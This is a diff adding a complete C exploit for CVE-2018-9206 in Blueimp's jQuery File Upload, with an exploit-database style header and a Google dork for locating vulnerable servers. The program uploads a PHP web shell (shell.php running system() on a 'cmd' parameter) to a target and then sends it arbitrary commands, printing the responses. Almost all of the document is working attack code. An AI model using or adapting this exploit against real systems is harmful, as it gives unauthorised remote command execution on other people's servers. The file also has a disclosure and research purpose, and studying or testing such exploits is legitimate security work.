@@ -1,0 +1,103 @@
+# Exploit Title: Exploit for Blueimp's jQuery File Upload <= 9.22.0 CVE-2018-9206
+# Google Dork: inurl: /jquery-file-upload/server/php
+# Date: 1/15/2019
+# Exploit Author: Larry W. Cashdollar
+# Vendor Homepage: http://www.vapidlabs.com
+# Software Link: [download link if available]
+# Version: <= 9.22.0
+# Tested on: Linux
+# CVE : CVE-2018-9206
+
+
+/*Exploits CVE-2018-9206 to install a webshell.*/
+/*http://www.vapidlabs.com/advisory.php?v=204 */
+/*$ gcc main.c -o blue_exploit */
+/*Larry W. Cashdollar @_larry0*/
+
+#include <stdio.h>
+#include <sys/socket.h>
+#include <stdlib.h>
+#include <netinet/in.h>
+#include <string.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+
+#define BSIZE 1024
+#define DEBUG 1
+#define TESTONLY 0
+
+void build_string (char *p, char *path, char *arg, char *ar1, int func);
+
+int
+main (int argc, char *argv[])
+{
+  int sock = 0, bytes_read = 0, total = 0, function = 0;
+  struct sockaddr_in serv_addr;
+  char buffer[BSIZE] = { 0 }, payload[BSIZE] = { 0};
+
+  if (argc <= 1)
+    {
+      printf
+	("CVE-2018-9206 Exploit\n@_larry0\nUsage: %s hostname port path command\n",
+	argv[0]);
+      return (0);
+    }
+  if (argc == 5)
+    function = 1;
+  if ((sock = socket (AF_INET, SOCK_STREAM, 0)) < 0)
+    {
+      printf ("\nSocket creation error\n");
+      return (-1);
+    }
+
+  build_string (payload,argv[3] ,argv[1], argv[4], function);
+
+if (!TESTONLY){
+
+  memset (&serv_addr, 0, sizeof (serv_addr));
+
+  serv_addr.sin_family = AF_INET;
+  serv_addr.sin_port = htons (atoi (argv[2]));
+
+  if (inet_pton (AF_INET, argv[1], &serv_addr.sin_addr) <= 0)
+    {
+      printf ("\nInvalid address.\n");
+      return (-1);
+    }
+
+  if (connect (sock, (struct sockaddr *) &serv_addr, sizeof (serv_addr)) < 0)
+    {
+      printf ("\nConnection Failed.\n");
+      return (-1);
+    }
+  send (sock, payload, strlen (payload), 0);
+}
+  if (DEBUG)
+    printf ("\nSending Payload:\n%s", payload);
+if (!TESTONLY) {
+  while (1)
+    {
+      bytes_read = recv (sock, buffer, BSIZE, 0);
+      total += bytes_read;
+      if (bytes_read <= 0)
+	break;
+      printf ("%s", buffer);
+      bzero (buffer, BSIZE);
+    }
+  printf ("\n[+] Total bytes read: %d\n", total);
+  close (sock);
+}
+  return (0);
+}
+
+
+void
+build_string (char *p, char *path,char *arg, char *ar1, int func)
+{
+  if (func)
+      snprintf (p, BSIZE,
+		"GET /%s/files/shell.php?cmd=%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: blueimp jquery exploit/9.22.0\r\nAccept: */*\r\n\r\n", path,ar1, arg);
+  else
+    snprintf (p, BSIZE,
+	      "POST /%s/index.php HTTP/1.1\r\nHost: %s\r\nUser-Agent: blueimp jquery exploit/9.22.0\r\nAccept: */*\r\nContent-Length: 244\r\nContent-Type: multipart/form-data; boundary=------------------------c8e05c8871143853\r\n\r\n--------------------------c8e05c8871143853\r\nContent-Disposition: form-data; name=\"files\"; filename=\"shell.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php $cmd=$_GET['cmd']; system($cmd);?>\r\n\r\n--------------------------c8e05c8871143853--\r\n\r\n",path, arg);
+}
